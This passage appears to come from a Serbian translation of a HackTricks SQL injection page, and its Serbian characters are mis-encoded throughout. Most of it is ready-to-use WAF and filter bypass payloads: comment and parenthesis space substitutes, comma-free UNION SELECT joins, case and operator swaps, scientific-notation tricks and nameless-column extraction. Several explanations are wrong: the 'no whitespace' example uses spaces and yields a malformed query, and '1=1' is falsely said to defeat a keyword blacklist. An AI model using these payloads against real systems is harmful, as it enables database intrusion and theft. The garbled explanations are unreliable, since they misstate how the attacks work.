Ovaj napadni vektor koristi SQL komentare (`/**/`) kako bi se zaobi≈°lo ograniƒçenje razmaka i ubacio SQL kod `UNION SELECT 1,2,3`.

### Prevencija

Da bi se spreƒçio ovaj tip napada, potrebno je pravilno filtrirati i validirati korisniƒçki unos. Takoƒëe, preporuƒçuje se kori≈°ƒáenje parametrizovanih upita ili ORM alata koji automatski sanitizuju korisniƒçki unos.

```sql
?id=1/*comment*/and/**/1=1/**/--
```

## No Whitespace - zaobila≈æenje kori≈°ƒáenjem zagrada

### Opis

No Whitespace (bez razmaka) tehnika zaobila≈æenja koristi se za izvr≈°avanje SQL injekcije kada je unos korisnika ograniƒçen tako da ne dozvoljava kori≈°ƒáenje razmaka. Ova tehnika koristi zagrade kako bi se zaobi≈°ao taj ograniƒçenje i omoguƒáilo izvr≈°avanje SQL upita.

### Napadni vektor

Napadaƒç mo≈æe iskoristiti ovu tehniku kada je unos korisnika ograniƒçen i ne dozvoljava kori≈°ƒáenje razmaka.

### Primer

Pretpostavimo da je SQL upit koji se izvr≈°ava na serveru sledeƒái:

```sql
SELECT * FROM users WHERE username='admin' AND password='password'
```

Napadaƒç mo≈æe iskoristiti No Whitespace tehniku zaobila≈æenja koristeƒái sledeƒái unos:

```
admin') OR ('a'='a
```

Kada se ovaj unos ubaci u SQL upit, rezultujuƒái upit ƒáe izgledati ovako:

```sql
SELECT * FROM users WHERE username='admin') OR ('a'='a' AND password='password'
```

Na ovaj naƒçin, napadaƒç je uspe≈°no zaobi≈°ao ograniƒçenje bez razmaka i izvr≈°io SQL injekciju.

### Prevencija

Da bi se spreƒçila No Whitespace SQL injekcija, preporuƒçuje se kori≈°ƒáenje parametrizovanih upita ili sanitizacija korisniƒçkog unosa. Takoƒëe, va≈æno je redovno a≈æurirati softver i primenjivati sigurnosne zakrpe kako bi se smanjio rizik od SQL injekcija.

```sql
?id=(1)and(1)=(1)--
```

### Bypass bez zareza

Bypass bez zareza - kori≈°ƒáenje OFFSET, FROM i JOIN

```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### Generiƒçki zaobilazi

Crna lista kori≈°ƒáenjem kljuƒçnih reƒçi - zaobila≈æenje kori≈°ƒáenjem velikih/malih slova

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

Crna lista kori≈°ƒáenjem kljuƒçnih reƒçi bez obzira na veliƒçinu slova - zaobila≈æenje kori≈°ƒáenjem ekvivalentnog operatora

Uobiƒçajena metoda za spreƒçavanje SQL injection napada je kori≈°ƒáenje crne liste kljuƒçnih reƒçi. Meƒëutim, ova metoda ƒçesto ne uzima u obzir veliƒçinu slova, ≈°to omoguƒáava napadaƒçima da zaobiƒëu za≈°titu.

Na primer, ako je kljuƒçna reƒç "admin" na crnoj listi, napadaƒç mo≈æe da umetne "ADMIN" ili "AdMiN" kako bi izbegao detekciju. Meƒëutim, postoji naƒçin da se zaobiƒëe ovakva za≈°tita kori≈°ƒáenjem ekvivalentnog operatora.

Umesto da koristite kljuƒçnu reƒç direktno, mo≈æete koristiti ekvivalentni operator koji ƒáe izvr≈°iti istu funkciju. Na primer, umesto da koristite "admin", mo≈æete koristiti "1=1", ≈°to je uvek taƒçno. Na taj naƒçin, SQL upit ƒáe biti izvr≈°en bez obzira na crnu listu kljuƒçnih reƒçi.

Na primer, umesto:

```
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```

Mo≈æete koristiti:

```
SELECT * FROM users WHERE username = '1=1' AND password = 'password';
```

Na ovaj naƒçin, SQL upit ƒáe biti izvr≈°en bez obzira na to da li je kljuƒçna reƒç "admin" na crnoj listi ili ne.

```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```

### Bypassiranje WAF-a pomoƒáu nauƒçne notacije

Mo≈æete pronaƒái detaljnije obja≈°njenje ove tehnike u [gosecure blogu](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
U osnovi, mo≈æete koristiti nauƒçnu notaciju na neoƒçekivane naƒçine kako biste zaobi≈°li WAF:

```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

### Zaobila≈æenje ograniƒçenja imena kolona

Prvo, primetite da ako **izvorna upit i tabela iz koje ≈æelite izvuƒái zastavicu imaju isti broj kolona**, mo≈æete jednostavno uraditi: `0 UNION SELECT * FROM flag`

Moguƒáe je **pristupiti treƒáoj koloni tabele bez kori≈°ƒáenja njenog imena** koristeƒái upit poput sledeƒáeg: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, pa bi u sluƒçaju SQL ubacivanja to izgledalo ovako:

```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```

Ili kori≈°ƒáenjem **zaobilaska zareza**:

```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```

Ova prevara je preuzeta sa [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Alati za predlaganje zaobila≈æenja WAF-a

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Ostali vodiƒçi

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista za otkrivanje Brute-Force napada

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}

‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji dogaƒëaj u oblasti sajber bezbednosti u **≈†paniji** i jedan od najva≈ænijih u **Evropi**. Sa **misijom promovisanja tehniƒçkog znanja**, ovaj kongres je vrelo mesto susreta za profesionalce iz oblasti tehnologije i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za sajber bezbednost**? ≈Ωelite li da vidite **va≈°u kompaniju reklamiranu na HackTricks**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
